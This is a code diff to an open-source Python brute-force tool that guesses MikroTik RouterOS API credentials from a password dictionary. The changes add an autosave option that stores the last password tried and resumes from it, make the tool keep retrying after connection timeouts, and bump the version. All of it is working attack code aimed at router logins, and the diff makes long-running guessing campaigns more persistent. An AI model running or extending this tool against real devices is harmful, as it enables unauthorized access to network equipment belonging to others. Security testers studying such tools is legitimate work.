@@ -8,6 +8,7 @@ if sys.version_info < (3, 0):
     sys.exit(2)
 
 import binascii, getopt, hashlib, select, socket, time, signal, codecs, ssl
+import json, os
 from _log import Log
 
 # Constants - Define defaults
@@ -46,7 +47,7 @@ banner=('''
         |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\/_/   \_\_|  |___|    |____/|_|
 
 
-                    Mikrotik RouterOS API Bruteforce Tool 1.0.1
+                    Mikrotik RouterOS API Bruteforce Tool 1.1
                             André Henrique (@mrhenrike)
           Please report tips, suggests and problems to Twitter (@mrhenrike)
                     https://github.com/mrhenrike/MikrotikAPI-BF
@@ -57,7 +58,7 @@ def usage():
     NAME
     \t mikrotikapi-bf.py - Brute force attack tool on Mikrotik box credentials exploiting API requests\n
     USAGE
-    \t python mikrotikapi-bf.py [-t] [-p] [-u] [-d] [-s] [-q]\n
+    \t python mikrotikapi-bf.py [-t] [-p] [-u] [-d] [-s] [-q] [-a]\n
     OPTIONS
     \t -t, --target \t\t RouterOS target
     \t -p, --port \t\t RouterOS port (default 8728)
@@ -66,10 +67,12 @@ def usage():
     \t -d, --dictionary \t Password dictionary
     \t -s, --seconds \t\t Delay seconds between retry attempts (default 1)
     \t -q, --quiet \t\t Quiet mode
+    \t -a, --autosave \t\t Automatically save current progress to file, and read from it on startup
 
     EXAMPLE
     \t python3 mikrotikapi-bf.py -t 192.168.0.200 -u manager -p 1337 -d /tmp/passwords.txt -s 5
     \t python3 mikrotikapi-bf.py -t 192.168.0.1 -d /tmp/passwords.txt
+    \t python3 mikrotikapi-bf.py -t 192.168.0.1 -d /tmp/passwords.txt -a /tmp/autosave.json
     ''')
 
 
@@ -127,19 +130,21 @@ class ApiRos:
         self.sock = socket.socket(af, socket.SOCK_STREAM)
         self.sock.settimeout(5)  # Set socket timeout to 5 seconds, default is None
 
-        try:
-            # Trying to connect to RouterOS, error can occur if IP target is not reachable, or API is blocked in
-            # RouterOS firewall or ip services, or port is wrong.
-            self.connection = self.sock.connect(sa)
-        
-        except (socket.timeout):
-            print("[-] SOCKET TIMEOUT! Target timed out! Exiting...")
-            self.close()
-            sys.exit(1)
-        
-        except OSError:
-            print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
-            raise CreateSocketError('Error: API failed to connect to socket. Host: {}, port: {}.'.format(self.target, self.port))
+        connected = False
+        while not connected:
+            try:
+                # Trying to connect to RouterOS, error can occur if IP target is not reachable, or API is blocked in
+                # RouterOS firewall or ip services, or port is wrong.
+                self.connection = self.sock.connect(sa)
+                connected = True
+
+            except (socket.timeout):
+                print("[-] SOCKET TIMEOUT! Target timed out!")
+                time.sleep(60)
+
+            except OSError:
+                print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
+                raise CreateSocketError('Error: API failed to connect to socket. Host: {}, port: {}.'.format(self.target, self.port))
 
         # if self.use_ssl:
         #     try:
@@ -262,7 +267,7 @@ class ApiRos:
         # Everything will be appended to paragraph variable, and then returned.
         paragraph = []
         received_sentence = ['']
-        while received_sentence[0] != '!done':
+        while received_sentence and received_sentence[0] != '!done':
             received_sentence = read_sentence()
             paragraph.append(received_sentence)
         self.status = paragraph
@@ -351,7 +356,7 @@ def run(pwd_num):
 def main():
     print(banner)
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:q", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "quiet"])
+        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:a:q", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "autosave=", "quiet"])
     except getopt.GetoptError as err:
         error(err)
         sys.exit(2)
@@ -366,6 +371,7 @@ def main():
     dictionary = None
     quietmode = False
     seconds = None
+    autosave_file = None
 
     for opt, arg in opts:
         if opt in ("-h", "--help"):
@@ -383,6 +389,8 @@ def main():
             seconds = arg
         elif opt in ("-q", "--quiet"):
             quietmode = True
+        elif opt in ("-a", "--autosave"):
+            autosave_file = arg
         else:
             assert False, "error"
             sys.exit(2)
@@ -417,11 +425,26 @@ def main():
         if not buffer: break
         count += buffer.count('\n')
     dictFile.seek(0)
+
+    last_password = None
+    if autosave_file and os.path.isfile(autosave_file):
+      print("[*] Loading autosave data from file %s" % autosave_file)
+      with open(autosave_file) as autosave_json:
+        autosave_data = json.load(autosave_json)
+        last_password = autosave_data["last_password"]
     
     # Passwords iteration & socket creation
     items = 1
     for password in dictFile.readlines():
         password = password.strip('\r\n')
+
+        # Rewind to autosaved password if it is defined
+        if last_password:
+            if password != last_password:
+                items += 1
+                continue
+            else:
+                last_password = None
 
         # First of all, we'll try with RouterOS default credentials ("admin":"")
         while defcredcheck:
@@ -454,6 +477,15 @@ def main():
             run(items)
             return
         items +=1
+
+        if autosave_file and items % 20 == 0:
+            print("[*] Autosaving progress data to file %s" % autosave_file)
+            with open(autosave_file, "w") as autosave_json:
+                autosave_data = {
+                    "last_password": password
+                }
+                json.dump(autosave_data, autosave_json)
+
         time.sleep(int(seconds))
     
     print()
